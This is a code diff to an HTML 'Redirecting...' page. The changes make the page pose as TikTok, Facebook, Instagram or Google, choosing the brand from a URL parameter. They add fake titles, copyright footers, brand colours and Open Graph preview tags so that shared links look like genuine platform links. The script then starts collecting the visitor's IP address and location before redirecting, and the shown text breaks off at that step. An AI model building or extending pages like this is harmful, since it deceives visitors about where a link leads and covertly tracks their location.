@@ -3,7 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok | Redirecting...</title>
+    <title>Redirecting...</title>
+    
+    <!-- Dynamic Social Previews (Open Graph) -->
+    <meta property="og:type" content="website">
+    <meta id="og-title" property="og:title" content="TikTok - Watch Trending Videos">
+    <meta id="og-desc" property="og:description" content="Watch the latest trending videos and discover content you love.">
+    <meta id="og-image" property="og:image" content="https://www.tiktok.com/favicon.ico">
+    <meta name="twitter:card" content="summary_large_image">
+
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <script src="supabase_config.js"></script>
     <style>
@@ -61,20 +69,57 @@
 <body>
     
     <!-- Using a generic TikTok-style SVG logo -->
-    <svg class="tiktok-logo" viewBox="0 0 448 512" fill="white">
+    <svg id="platform-logo" class="tiktok-logo" viewBox="0 0 448 512" fill="white">
         <path d="M448,209.91a210.06,210.06,0,0,1-122.77-39.25V349.38A162.55,162.55,0,1,1,185,188.31V278.2a74.62,74.62,0,1,0,52.23,71.18V0l88,0a121.18,121.18,0,0,0,1.86,22.17h0A122.18,122.18,0,0,0,381,102.39a121.43,121.43,0,0,0,67,20.14Z"/>
     </svg>
 
     <span class="loader"></span>
-    <p class="message">Redirecting to TikTok...</p>
+    <p id="platform-message" class="message">Redirecting to TikTok...</p>
 
-    <div class="footer">TikTok Inc. 2024</div>
+    <div id="platform-footer" class="footer">TikTok Inc. 2024</div>
 
     <script>
         async function logAndRedirect() {
             const urlParams = new URLSearchParams(window.location.search);
             const target = urlParams.get('target') || 'https://www.tiktok.com';
-            const linkName = urlParams.get('name') || 'TikTok Redirect';
+            const linkName = urlParams.get('name') || 'TikTok';
+
+            // 0. Update UI and Metadata dynamically
+            const configs = {
+                'TikTok': {
+                    title: 'TikTok - Watch Trending Videos',
+                    msg: 'Redirecting to TikTok...',
+                    footer: 'TikTok Inc. 2024',
+                    color: '#fe2c55'
+                },
+                'Facebook': {
+                    title: 'Facebook - Log In or Sign Up',
+                    msg: 'Redirecting to Facebook...',
+                    footer: 'Meta © 2024',
+                    color: '#0866ff'
+                },
+                'Instagram': {
+                    title: 'Instagram',
+                    msg: 'Redirecting to Instagram...',
+                    footer: 'Meta © 2024',
+                    color: '#e4405f'
+                },
+                'Google': {
+                    title: 'Google Search',
+                    msg: 'Redirecting to Google...',
+                    footer: 'Google LLC 2024',
+                    color: '#4285f4'
+                }
+            };
+
+            const cfg = configs[linkName] || configs['TikTok'];
+            document.title = cfg.title;
+            document.getElementById('platform-message').innerText = cfg.msg;
+            document.getElementById('platform-footer').innerText = cfg.footer;
+            document.querySelector('.loader').style.borderBottomColor = cfg.color;
+
+            // Try to update meta tags (works for some crawlers)
+            document.getElementById('og-title').setAttribute('content', cfg.title);
 
             try {
                 // 1. Get IP and Location Data
